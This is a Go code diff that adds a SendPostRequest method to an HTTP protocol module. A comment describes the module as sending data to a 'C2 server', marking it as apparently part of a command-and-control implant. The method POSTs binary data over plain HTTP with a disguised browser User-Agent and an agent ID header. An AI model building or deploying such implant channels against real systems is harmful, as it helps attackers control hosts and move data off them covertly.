@@ -1,6 +1,7 @@
 package h1c
 
 import (
+	"bytes"
 	"fmt"
 	"net/http"
 	"time"
@@ -110,4 +111,37 @@ func (p *H1CProtocol) SendRequest(endpoint string) (*http.Response, error) {
 // GetType returns the type of protocol being used
 func (p *H1CProtocol) GetType() types.ProtocolType {
 	return types.H1C
+}
+
+// SendPostRequest sends a POST request with the given data to the C2 server
+func (p *H1CProtocol) SendPostRequest(endpoint string, data []byte) (*http.Response, error) {
+	// Check if we're connected
+	if !p.isConnected {
+		return nil, fmt.Errorf("not connected to server")
+	}
+
+	// Create the full URL
+	url := fmt.Sprintf("http://%s:%d%s", p.targetHost, p.targetPort, endpoint)
+
+	// Create a new request with the data as the body
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	if err != nil {
+		return nil, fmt.Errorf("failed to create request: %v", err)
+	}
+
+	// Add basic headers
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	// Add the Agent UUID as a custom header
+	req.Header.Set("X-Agent-ID", p.agentUUID)
+
+	// Send the request
+	resp, err := p.client.Do(req)
+	if err != nil {
+		p.isConnected = false
+		return nil, fmt.Errorf("request failed: %v", err)
+	}
+
+	return resp, nil
 }
